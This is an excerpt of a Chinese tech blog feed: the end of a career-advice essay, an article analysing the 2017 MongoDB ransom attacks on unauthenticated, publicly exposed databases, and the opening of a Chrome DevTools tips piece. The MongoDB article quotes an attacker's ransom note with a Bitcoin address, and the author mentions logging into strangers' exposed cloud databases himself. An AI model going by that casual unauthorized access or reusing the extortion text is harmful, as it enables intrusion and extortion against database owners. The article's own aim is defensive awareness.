<li>因为你学习能力强，所以，你会有更多的机会解决难题。</li>
<li>你有更多的机会解决难题，你就会学更多的东西，于是你就会更强。</li>
<li>上面这个循环，只要循环上几年，就会让你人生的各种可能性大大的增加。</li>
</ul>
<p><strong>【 注意 】</strong></p>
<ul>
<li>要达到这样的特质，需要找到自己的长处、以及适合自己的环境。就像鱼的特长是呆在水里，让鱼儿去追求陆上动物的刺激生活并不靠谱。</li>
</ul>
<ul>
<li>一般说来，有这样的潜质的人，在学校中就应该要出现。如果你在大学中还没有出现这样的潜质，那么，你在工作当中要加倍努力了（注：所谓的加倍努力，不是让你使蛮力加班，而是让你多学习成长，使蛮力拼命是弥补不了能力、思维、眼界上的缺陷的）。</li>
</ul>
<ul>
<li>Leadership也有范围的，比如，身边的朋友，工作中的团队/部分，圈内，整个行业。Leadership的范围越大，你的个人发展的选择性就越高。反之则越小。</li>
</ul>
<ul>
<li>如果已到了30岁左右，还是没有出现这样的特征。那么，可能未来你也很难有这样的Leadership了。而你的个人发展的可能性可能也就不多了（sigh…）</li>
</ul>
<p><strong>读到这里，我必需要说一下，如果你已开始显现出你的Leadership，那么你才谈得上个人发展，这篇文章后续的内容也可能才会对你有意义</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95%E7%9A%84%E4%B8%89%E4%B8%AA%E6%96%B9%E5%90%91"></span>个人发展的三个方向<span class="ez-toc-section-end"></span>
</h4>
<p>以我个人短浅的经历和视野，目前只看到的人的发展有如下三个大方向（他们之间可能会有重叠）：</p>
<p style="padding-left: 30px;">1）<strong>在职场中打拼</strong></p>
<p style="padding-left: 30px;">2）<strong>去经历有意义有价值的事</strong></p>
<p style="padding-left: 30px;">3）<strong>追求一种自由的生活</strong></p>
<p>这三个方向，我个人或多或少都体验过，我也见过身边的很多人走这三个方向走的比较成功。也许还有别的方向，没办法，现在，我的视野就这么大，所以，我在这里，我主要就是谈谈这三个方向。Again，<strong>人有资格去走这三个方向的前提是——已有了上面我说的Leadership那种特质！</strong></p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E5%9C%A8%E8%81%8C%E5%9C%BA%E4%B8%AD%E5%8F%91%E5%B1%95"></span>一、在职场中发展<span class="ez-toc-section-end"></span>
</h4>
<p>在职场中发展应该是绝大多数人的选择。通过加入公司来达到人生的发展。</p>
<p>我们经常可以看到很多所谓的“职业规划”，但是大多数职业规划只不过人力资源搞出来的东西，和实际其实是有很大出入的。我的人生经历中，有18年左右是在公司中度过的，在过银行，小公司，大公司，民营公司，外国公司，传统IT公司，互联网公司，不同的公司完全有不同的玩法和文化，我的经历还算丰富，但也不算特别成功，这里只分享一些我在职场中的心得（不一定对，仅供参考）。</p>
<h5>
<span class="ez-toc-section" id="1%E3%80%81%E5%8E%BB%E9%A1%B6%E5%B0%96%E5%85%AC%E5%8F%B8"></span>1、去顶尖公司<span class="ez-toc-section-end"></span>
</h5>
<p><strong>去顶尖公司的一个目的就是让你的Leadership的范围的可能性扩大</strong>。</p>
<p>因为公司和公司的差距也不小，所以，就算你在低端公司里是骨干份子，但在高端公司里可能只是一个普通员工（就像中国足球队的主力到了英超可能都无法入选）。所以，在职场中，如果你要让你的个人价值最大化的话，你一定要去顶尖的公司。因为顶尖公司里有非常不错的工作方法和场景，这并不是能看书或是交流得来的，这是必需要去亲身体验的。所以说，在顶尖公司掌握的技能，开阔的眼界，通常来说都会比低端公司的要多得多。</p>
<p>另外，每个公司的工作级别都是有相互对标的，比如：阿里的P几对应于百度的T几。国内的一线公司职位还相当，但是如果和国外一线公司的比，那就有差距了，而且差距还很大。比如，Google或Facebook的某个高级工程师，可能就对应于阿里的P8/P9甚至更高。</p>
<p>是的，对于职场来说，如果你在顶尖公司是骨干，那么，你去低端公司，则有很大机会会成为他们高管和核心。就好像你在Facebook里干三五年成为他们的技术骨干，那么你到BAT去成成为高管概率是非常大的。反过来，如果你毕业主去了BAT成为了一个螺丝钉，在天天加班中度过你的青春，你干个十年能成为BAT的高管的概率可能会非常的低。</p>
<h5>
<span class="ez-toc-section" id="2%E3%80%81%E5%8E%BB%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%88%9B%E4%B8%9A%E5%85%AC%E5%8F%B8"></span>2、去真正的创业公司<span class="ez-toc-section-end"></span>
</h5>
<p>去顶尖公司和去创业公司在某些时候并不冲突。不过，这里我想讲的是，一个技术能力强的人在大公司可能会被埋没掉。因为大公司业务成功后，</p>
<ul>
<li>成功的公司在招聘各种高级技术人才都不会成为问题，于是少你一个不少，多你一个不多。</li>
</ul>
<ul>
<li>成功的公司其整个技术体系已经完成，Legacy的问题也比较多，所以，可以供你发挥的余地不大。</li>
</ul>
<ul>
<li>成功的公司更多的可能会想要稳定的系统，稳定必然会产生保守，而保守则产生不思进取。</li>
</ul>
<p>所以，对于中高级人才来说，在大公司里的能产生的个人价值，可能远远不如那些求贤若渴、没有包袱、可以尽情施展、相对更为灵活和自由的创业型公司。</p>
<p>不过，去创业公司需要小心仔细的挑选和评估，创业公司的不确定因素很多，也和创始人的因素太大了，所以，你需要小心了解创始人和他们的业务情况，想法和理念差不多才能更好的共事。</p>
<p>好多创业公司其实并不是真正的创业公司，他们创业有很大的侥幸和驱利心理，要小心甄别。因为那不是真正的创业公司。</p>
<h5>
<span class="ez-toc-section" id="3%E3%80%81%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF%E7%9A%84%E5%8F%91%E5%B1%95%E9%98%B6%E6%AE%B5"></span>3、职业生涯的发展阶段<span class="ez-toc-section-end"></span>
</h5>
<p>首先，有一个不争事实——<strong>整个社会是会把最重要的工作交给30岁左右的这群人的。也就是说，30岁左右这群人是这个社会的做事的中坚力量。</strong></p>
<p>所以，这是一个机遇！如果你有了Leadership，你就一定能在这个时间段内赶得上这个机遇——公司和领导对你寄于信任和厚望，并把重要的团队和工作交给你。</p>
<p>于是，你的30岁到40岁就成了一个职业生涯的发展期，也就是你的事业上升期。如果你到40岁都没有赶上，那么你的职业生涯也就这样了，老有所成的人是少数。</p>
<p>在你事业的上升期，你需要更多的软技能，比如：</p>
<ul>
<li>带领产品和业务的发展的能力</li>
<li>推行自己喜欢的文化的能力</li>
<li>项目管理的能力——在任务重、时间紧中求全</li>
<li>沟通和说服别人的能力</li>
<li>解决冲突的能力</li>
<li>管理和发展团队的能力</li>
<li>解决突发事件的应急能力</li>
<li>…… ……</li>
</ul>
<p>另外，你还要明白在职场里的几个冷酷的事实：</p>
<ul>
<li>
<strong>你开始要关心并处理复杂的人事</strong>。尤其在大公司，大量的人都是屁股决定脑袋，利益关系复杂，目标不一致，每个人心里都有不一样的想法。这个时候再也不是talk is cheap, show me the code！而是，code is cheap，talk is the matter。你需要花大量的时间去思考和观察形形色色的人。需要耗费大量的精力在不同的人之间周旋，而不是花时间去创造些什么有价值的东西。</li>
</ul>
<ul>
<li>
<strong>你要开始学会使用各种政治手段</strong>。办公室政治不可避免，越大的公司越重，自从你开始成为一线的leader的那一天起，你就开始成为“里外不是人”的角色，需要在下属和领导，员工和公司之间周旋。随而你的级别越来越高，你需要使用更多的政治手段，你会学会审时度世的站队，学会迎合员工和领导，学会用官员的语言说话，学会此一时彼一时，学会妥协和交换，学会忍气吞声，学会在在适当的时机表现自己，学会波澜不惊，学会把自己隐藏起来，甚至你还会迷失自我，开始学会一些厚黑学，比如不得不在适当的时机在背后捅人刀子……你可能会成为一个你自己都讨厌的人</li>
</ul>
<p>听上去真的好无聊，所以，你现在也明白为什么高层们都看上去很忙很累，而且抽不出时间来关心细节问题，因为，他们更多的是要协调整个组织和系统来运转，甚至还要四处周旋，各种博弈，没办法，这是职场的必需的东西！听起来是不是感觉人类很愚蠢？这真是没办法的事。如果你不想或是也没有能力玩这些东西，那么你需要去那些可以让技术人员安安心心做技术的公司。这类的公司，我见过Microsoft、Google、Amazon或是一些创业公司里都有。国内的大公司中也有让技术人员成长的职业成长线，但老实说，表面上看似是一个让人专心做技术的升职成长线，但其实还是管理岗位。</p>
<p>所以，<strong>技术人员在职场中的归宿有两条路 —— 到真正的技术公司成为一个专心做技术的人，或是在成为一个职业的经理人</strong>。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E8%BF%BD%E6%B1%82%E4%BA%BA%E7%94%9F%E7%9A%84%E7%BB%8F%E5%8E%86"></span>二、追求人生的经历<span class="ez-toc-section-end"></span>
</h4>
<p>先说三个故事，</p>
<ul>
<li>第一个，是在阿里的时候，有一天在内网里看到一个贴子，一个做产品的女孩说自己准备离职要去法国学烘培厨艺，引得大家热评。</li>
</ul>
<ul>
<li>第二个，是在亚马逊的美国老板，他每年都要去报个培训班学一个技能，比如：厨艺、开双翼飞机、夜总会里的DJ……、甚至去华盛顿去学当一个政客。</li>
</ul>
<ul>
<li>第三个，是在汤森路透工作时，一个英国的同事，有一天他说他离职了，和自己的老婆准备用余生去周游世界，我问他是不是有足够多的钱了？他和我说，钱不够，他俩口子的计划是，边旅游边打工，打工打够到下一站的钱就走。他还说，那种用假期去另一个城市的旅游太没意思了，如果你不在那个地方生活上一段时间 ，你怎么能算是好的旅游体验呢？好吧，无法反驳。</li>
</ul>
<p>我是觉得他们把自己的人生过得如此有意思，令我很佩服。虽然跨界跨得有点猛，但是 Why Not？</p>
<p>在这里，我想说，去追求一种和众人不一样的人生经历也是一件挺好的事，我个人感觉，比起在职场里有趣地多多了。如果你厌倦了职场，其实为什么不去追求一下不同的人生经历呢。就算你不想去追求跨度比较大的人生经历，那么，在技术圈里，也有很多有价值有意思的经历也可以去的。<strong>追求刺激有意义的与众不同的经历的人，其实也能算是一种人生的成功，不是吗？</strong></p>
<p>如果只说技术方面，我个人看到的去追求经历的人，有两种追求的人其实也很成功的：</p>
<ul>
<li>
<strong>到技术创新的发源地去经历创新</strong>。计算机互联网各种技术的创新引擎，基本上来说，就是在美国了。我们赶上了这个时代，也选对了这个时代最火热的行业，那么，有什么理由不去这个时代的技术发动机那里去经历呢？在美国硅谷湾区，无论是大公司，还是创业公司，都在迸发着各式各样的创新，如果有能力有机会，为什么不努力去经历一下呢？不经历一下，老了不会觉得错过了是一种后悔吗？</li>
</ul>
<ul>
<li>
<strong>去经历下一个热点技术的发展</strong>。从IT，到互联网、再到移动互联网、云计算、大数据，再到未来的AI，VR，IoT……，技术创新的浪潮一波接一波的过来，你是想在那继续搬砖搬下去，是想迎浪而上去经历浪潮，还是想成为一个随波逐流的人？</li>
</ul>
<p>打工也好，创业也好，在国内也好，在国外也好，这些都是形式，不是内容。内容则是你有没有和有想法的人去经历有意义有价值事？人生苦短，白驹过隙，我们技术人员最大的幸运就是生在这样一个刺激的时代，那么，你还有什么理由不去追逐这些前沿刺激的经历呢？</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E8%BF%BD%E6%B1%82%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%9F%E6%B4%BB"></span>三、追求自由的生活<span class="ez-toc-section-end"></span>
</h4>
<p>我相信“自由”这个事，是所有人的心中都会想去追求的。“生命诚可贵，爱情价更高，…… ”（哈哈）</p>
<p>但一说起自由，绝大多数人都想到的是“财富自由”或是“财务自由”，其实，并不完全是这样的，在自由的通路上，我个人的经历告诉我，其实，你会有很多的不同类型的自由。下面，是我对几个层次的“自由”的理解。</p>
<p><strong>第一层自由——工作自由</strong>。人的第一层自由的境界是——“工作自由”，我到不是说你在工作单位上可以很自由，虽然有特例，但并不普遍。我想说的“工作自由”是——你不会有失业危机感了。也就是说，你成了各个公司的抢手货，你不但不愁找不到工作，而且你是完全不愁找不到好工作。试想一下，如果是工作来找你，一方面，你就有真正意义上的工作选择权了，另一方面，你都不愁工作了，你完全就可以随时离职去干你想干的事了。此时，你就达到了“工作自由”。</p>
<p><strong>第二层自由——技能自由</strong>。工作自由已是不错，不过前提是你还是需要依赖于别人提供的工作机会。而技能自由则是你可以用自己的技能养活自己，而不需要去公司里工作。也就是所谓的自由职业者了，社会上，这样的人也不少，比如，一些健身体育教练、设计师、翻译者、作者……这些都可以算是自由职业者，程序员这个职业中只要不是搬砖的，有想法的，就有可以成为自由积业者的潜质，想一想，你拥有的编程能力，其实是一种创造的能力，也就是创造力，只要你Make Something People Want（YC创业公司的slogan），你是完全可以通过自己的技能来养活自己的。如果你通过某些自动化的东西，或是你在App上做了一个软件个体户，让自己的收入不断，甚至你做了一个开源软件，社区每个月都给你捐款捐到比你打工挣的还多，那么你就真正的有了技能自由了。</p>
<p><strong>第三层自由——物质自由。</strong>我把财务自由换了一种说法。我个人觉得，除了有个好爸爸之外这种特例的情况，如果你想有物质自由的话，本质上来说，你一定要学会投资，投资不一定是你的钱，时间也是一种财富，年轻更是，你怎么投资你的时间还有你的青春？你要把你的投资投到什么样的事，什么样的人？对于投资这个事，风险也比较大。但是，人生不敢冒险可能才是最大的冒险。这个世界有很多技术不是你能看书学来的，而要只能在实战中学会的，比如：游泳。投资可能也是一种。只有真正懂投资的人，或是运气非常好的人，才可能实现物质自由。</p>
<p>追求自由的生活，其实也是个人发展道路上的一个不错的选择。通常来说，自由的人，能力都不差，钱也不会少。因为，他们懂得投资。</p>
<p>也就是说，拥有追求自由能力的的人，</p>
<ul>
<li>不但有领导力和创造力（也可指导大多数人并走在大多数人前面）</li>
<li>同时他还懂得怎么投资（知道时间和精力和金钱应该投在什么地方）</li>
</ul>
<p>（注：这里我没有提精神自由，老实说，精神上的自由我也不清楚是什么东西，因为我还没有见过，眼界有限，所以先按不表了，不然真成鸡汤文了）</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>无论是在职场中打拼，还是追求精彩的经历，还是去实现自由，我觉得都是不错的个人发展的方向。</p>
<p>他们都有重叠，比如：</p>
<ul>
<li>你可以在职场中去追求那些刺激的经历的公司。</li>
<li>同样也可以通过加入有潜力高速发展的公司来达到自由。</li>
<li>你也可以通过追寻不一样的经历来达到人生的自由。</li>
<li>……</li>
</ul>
<p><strong>总之，这里的逻辑是——</strong></p>
<ul>
<li>
<strong>能够去规划自己的个人发展的人，通常都是有很多机会和可能性的人</strong>。</li>
</ul>
<ul>
<li><strong>有很多机会和可能性的人，通常都是有Leadership，喜欢冒险的人。</strong></li>
</ul>
<ul>
<li><strong>有Leadership喜欢冒险的人，通常都是学习能力强，思维活跃，喜欢折腾，懂得“投资”的人。</strong></li>
</ul>
<ul>
<li><strong>学习能力强思维活跃的人，通常来说，都是喜欢看书，喜欢实践和新鲜事物，不怕艰难和挑战，用智力而不是使蛮力的人。</strong></li>
</ul>
<ul>
<li><strong>懂得“投资”的人，通常来说，他们更多的关注的是未来和长远的成长，而不是当下的KPI、奖金和晋升。</strong></li>
</ul>
<p> </p>
<figure id="attachment_17592" aria-describedby="caption-attachment-17592" style="width: 700px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-17592" class="wp-caption-text"><center>插图来自电影《飞屋环游记》</center></figcaption></figure>
<p style="text-align: center;"><strong>最后祝大家新年快乐，来年大展鸿图。</strong></p>
<p>（全文完）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-12-28T12:29:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/17583.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 从 MongoDB “赎金事件” 看安全问题 ]]></title>
<link>https://coolshell.cn/articles/17607.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >今天上午（2017年1月7日），我的微信群中同时出现了两个MongoDB被黑掉要赎金的情况，于是在调查过程中，发现了这个事件。这个事件应该是2017年开年的第一次比较大的安全事件吧，发现国内居然没有什么报道，国内安全圈也没有什么动静（当然，他们也许知道，只是不想说吧），Anyway，让我这个非安全领域的人来帮补补位。</p>
<h4>事件回顾</h4>
<p>这个事情应该是从2017年1月3日进入公众视野的，是由安全圈的大拿 Victor Gevers （网名：<a href="https://twitter.com/0xDUDE" target="_blank">0xDUDE</a>，<span class="js-display-url"><a class="twitter-timeline-link" dir="ltr" title="http://GDI.foundation" href="http://GDI.foundation" target="_blank" rel="nofollow noopener" data-expanded-url="http://GDI.foundation">GDI.foundation</a> </span>的Chairman），其实，他早在2016年12月27日就发现了一些在互联网上用户的MongoDB没有任何的保护措施，被攻击者把数据库删除了，并留下了一个叫 WARNING 的数据库，这张表的内容如下：</p>
<pre><code class="language-sql">{
    "_id" : ObjectId("5859a0370b8e49f123fcc7da"),
    "mail" : "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3951584b5852084b08794a505e5850574d17564b5e">[email protected]</a>",
    "note" : "SEND 0.2 BTC TO THIS ADDRESS 13zaxGVjj9MNc2jyvDRhLyYpkCh323MsMq AND CONTACT THIS EMAIL WITH YOUR IP OF YOUR SERVER TO RECOVER YOUR DATABASE !"
}</code></pre>
<p>基本上如下所示：</p>
<p><span id="more-17607"></span></p>
<figure id="attachment_17609" aria-describedby="caption-attachment-17609" style="width: 646px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-17609" class="wp-caption-text">MongoDB ransom demand (via Victor Gevers)</figcaption></figure>
<p>说白了就是黑客留下的东西——<strong>老子把你的MongoDB里的数据库给转走了，如果你要你的数据的话，给我0.2个的比特币（大约USD200）</strong>。然后，他的twitter上不断地发布这个“赎金事件”的跟踪报道。与此同时，中国区的V2EX上也发现了相关的攻击问题 《<a href="https://www.v2ex.com/t/331887" target="_blank">自己装的 mongo 没有设置密码结果被黑了</a>》</p>
<p>然后，在接下来的几天内，全球大约有1800个MongoDB的数据库被黑，这个行为来自一个叫 Harak1r1 的黑客组织（这个组织似乎就好黑MongoDB，据说他们历史上干了近8500个MongoDB的数据库，几乎都是在祼奔的MongoDB）。</p>
<p>不过，这个组织干了两天后就停手了，可能是因为这事已经引起了全球科技媒体的注意，产生了大量的报道（如果你在Google News里查一下“<a href="https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=mongodb+ransom&amp;newwindow=1&amp;tbm=nws" target="_blank">mongodb ransom</a>”，你会看到大量的报道（中文社区中，只有<a href="https://unwire.pro/2017/01/05/2000-mongodb-ransom/security/" target="_blank">台湾有相关的报道</a>）），他们也许是不敢再搞下去了。</p>
<p>不过，很快，有几个copycats开始接着干，</p>
<p>马上跟进的是 own3d ，他们留下的数据库的名字叫 WARNING_ALERT，他们至少干掉了 930个MongoDB，赎金0.5个比特币（USD500），至少有3个用户付费了</p>
<p>然后是0704341626asdf，他们留下的数据库名字叫PWNED，他们至少干掉了740个MongoDB，赎金0.15个比特币（USD150），看看他们在数据库里留下的文字——<strong>你的MongoDB没有任何的认证，并且暴露在公网里（你TMD是怎么想的？）……</strong></p>
<figure id="attachment_17610" aria-describedby="caption-attachment-17610" style="width: 616px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-17610" class="wp-caption-text">0704341626asdf group ransom note (via Victor Gerves)</figcaption></figure>
<p>就在这两天，有两个新的黑客也来了</p>
<ul>
<li>先是kraken0，发现到现在1天了，干了13个MongoDB，赎金 0.1个比特币。</li>
<li>然后是 3lix1r，发现到现在5个小时，干了17个MongoDB，赎金0.25比特币。</li>
</ul>
<p>BBC新闻也于昨天报道了这一情况——《<a href="https://www.bbc.com/news/technology-38521973" target="_blank">Web databases hit in ransom attacks</a>》，现在这个事情应该是一个Big News了。</p>
<h4>关于MongoDB的安全</h4>
<p>安全问题从来都是需要多方面一起努力，但是安全问题最大的短板就是在用户这边。这次的这个事，说白了，就是用户没有给MongoDB设置上用户名和口令，然后还把服务公开到了公网上。</p>
<p>是的，这个安全事件，相当的匪夷所思，为什么这些用户要在公网上祼奔自己的数据库？他们的脑子是怎么想的？</p>
<p>让我们去看一下Shodan上可以看到的有多少个在暴露在公网上而且没有防范的MongoDB？我了个去！<strong>4万7千个，还是很触目惊心的</strong>（下图来自我刚刚创建的 <a href="https://www.shodan.io/report/h0bgF6zM" target="_blank">Shodan关于MongoDB的报表</a>）</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p>那么，怎么会有这么多的对外暴露的MongoDB？看了一下Shodan的报告，发现主要还是来自公有云平台，Amazon，Alibaba，Digital Ocean，OVH，Azure 的云平台上有很多这样的服务。不过，像AWS这样的云平台，有很完善的默认安全组设置和VPC是可以不把这样的后端服务暴露到公有云上的，为什么还会有那么多？</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p>这么大量的暴露在公网上的服务是怎么回事？有人发现（参看这篇文章《<a href="https://blog.shodan.io/its-the-data-stupid/" target="_blank">It’s the Data, Stupid!</a>》 ），MongoDB历史上一直都是把侦听端口绑在所有的IP上的，这个问题在5年前（2011年11月）就报给了MongoDB (<a href="https://jira.mongodb.org/browse/SERVER-4216" target="_blank">SERVER-4216</a>)，结果2014年4月才解决掉。所以，他觉得可能似乎 MongoDB的 2.6之前的版本都会默认上侦听在0.0.0.0 。</p>
<p>于是我做了一个小试验，到我的Ubuntu 14.04上去 <code>apt-get install mongodb</code>（2.4.9版），然后我在<code>/etc/mongodb.conf</code> 文件中，看到了默认的配置是127.0.0.1，mongod启动也侦听在了127.0.0.1这台机器上。一切正常。不过，可能是时过境迁，debain的安装包里已加上了这个默认配置文件。不管怎么样，MongoDB似乎是有一些问题的。</p>
<p>再到Shodan上看到相关的在公网裸奔的MongoDB的版本如下，发现3.x的也是主流：</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p>虽然，3.x的版本成为了主流，但是似乎，还是有很多人把MongoDB的服务开到了互联网上来，而且可以随意访问。</p>
<p><strong>你看，我在阿里云随便找了几台机器，一登就登上去了。</strong></p>
<p><img alt="image placeholder" ></p>
<p>真是如那些黑客中的邮件所说的：WTF，你们是怎么想的？</p>
<h4>后续的反思</h4>
<p>为什么还是有这么多的MongoDB在公网上祼奔呢？难道有这么多的用户都是小白？这个原因，是什么呢？我觉得可能会是如下两个原因：</p>
<p style="padding-left: 30px;">1）一是技术人员下载了mongod的软包，一般来说，mongodb的压缩包只有binary文件 ，没有配置文件 ，所以直接解开后运行，结果就没有安全认证，也绑在了公网上。也许，MongoDB这么做的原因就是为了可以快速上手，不要在环境上花太多的时间，这个有助于软件方面的推广。但是，这样可能就坑了更多的人。</p>
<p style="padding-left: 30px;">2）因为MongoDB是后端基础服务，所以，需要很多内部机器防问，按道理呢，应该绑定在内网IP上，但是呢，可能是技术人员不小心，绑在了0.0.0.0的IP上。</p>
<p>那么，这个问题在云平台上是否可以更好的解决呢？</p>
<p><strong>关于公网的IP。</strong>一般来说，公有云平台上的虚拟主机都会有一个公网的IP地址，老实说，这并不是一个好的方法，因为有很多主机是不需要暴露到公网上的，所以，也就不需要使用公网IP，于是，就会出现弹性IP或虚拟路由器以及VPC这样的虚拟网络服务，这样用户在公有云就可以很容易的组网，也就没有必要每台机器都需要一个公网IP，使用云平台，最好还是使用组网方案比较好的平台。</p>
<p><strong>关于安全组</strong>。在AWS上，你开一台EC2，会有一个非常严格的安全组——只暴露22端口，其它的全部对外网关闭。这样做，其实是可以帮用户防止一下不小心把不必要的服务Open到公网上。按道理来说，AWS上应该是帮用户防了这些的。但是，AWS上的MongoDB祼奔的机器数量是最多的，估计和AWS的EC2的 基数有关系吧（据说AWS有千万台左右的EC2了）</p>
<p>最后，提醒大家一下，被黑了也不要去付赎金，因为目前来说没有任何证据证明黑客们真正保存了你的数据，因为，被黑的服务器太多了，估计有几百T的数据，估计是不会为你保存的。下面也是Victor Gevers的提示：</p>
<p><img alt="image placeholder" ></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-01-07T17:11:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/17607.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Chrome开发者工具的小技巧 ]]></title>
<link>https://coolshell.cn/articles/17634.html</link>
<content><![CDATA[ 
<p>Chrome的开发者工具是个很强大的东西，相信程序员们都不会陌生，不过有些小功能可能并不为大众所知，所以，写下这篇文章罗列一下可能你所不知道的功能，有的功能可能会比较实用，有的则不一定，也欢迎大家补充交流。</p>
<p>话不多话，我们开始。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F%E5%8C%96" title="代码格式化">代码格式化</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%BC%BA%E5%88%B6DOM%E7%8A%B6%E6%80%81" title="强制DOM状态">强制DOM状态</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%8A%A8%E7%94%BB" title="动画">动画</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91%E7%BD%91%E9%A1%B5" title="直接编辑网页">直接编辑网页</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%BD%91%E7%BB%9C%E9%99%90%E9%80%9F" title="网络限速">网络限速</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%A4%8D%E5%88%B6HTTP%E8%AF%B7%E6%B1%82" title="复制HTTP请求">复制HTTP请求</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%8A%93%E4%B8%AA%E5%B8%A6%E6%89%8B%E6%9C%BA%E7%9A%84%E5%9B%BE" title="抓个带手机的图">抓个带手机的图</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-8" href="#%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9" title="设置断点">设置断点</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E7%BB%99DOM%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9" title="给DOM设置断点">给DOM设置断点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E7%BB%99XHR%E5%92%8CEvent_Lisener%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9" title="给XHR和Event Lisener设置断点">给XHR和Event Lisener设置断点</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-11" href="#%E5%85%B3%E4%BA%8EConsole%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7" title="关于Console中的技巧">关于Console中的技巧</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#DOM%E6%93%8D%E4%BD%9C" title="DOM操作">DOM操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#Console%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0" title="Console中的一些函数">Console中的一些函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#Console%E7%9A%84%E8%BE%93%E5%87%BA" title="Console的输出">Console的输出</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E5%85%B3%E4%BA%8Econsole%E5%AF%B9%E8%B1%A1" title="关于console对象">关于console对象</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#%E5%85%B3%E4%BA%8E%E5%BF%AB%E6%8D%B7%E9%94%AE" title="关于快捷键">关于快捷键</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F%E5%8C%96"></span>代码格式化<span class="ez-toc-section-end"></span>
</h4>
<p>有很多css/js的代码都会被 minify 掉，你可以点击代码窗口左下角的那个 <strong><code>{ }</code></strong>  标签，chrome会帮你给格式化掉。</p>
<p><img alt="image placeholder" ></p>
<p><span id="more-17634"></span></p>
<h4>
<span class="ez-toc-section" id="%E5%BC%BA%E5%88%B6DOM%E7%8A%B6%E6%80%81"></span>强制DOM状态<span class="ez-toc-section-end"></span>
</h4>
<p>有些HTML的DOM是有状态的，比如&lt;a&gt; 标签，其会有 active，hover， focus，visited这些状态，有时候，我们的CSS会来定关不同状态的样式，在分析网页查看网页上DOM的CSS样式时，我们可以点击CSS样式上的 <strong><code>:hov</code></strong> 这个小按钮来强制这个DOM的状态。</p>
<p> </p>
<p><img alt="image placeholder" ></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%8A%A8%E7%94%BB"></span>动画<span class="ez-toc-section-end"></span>
</h4>
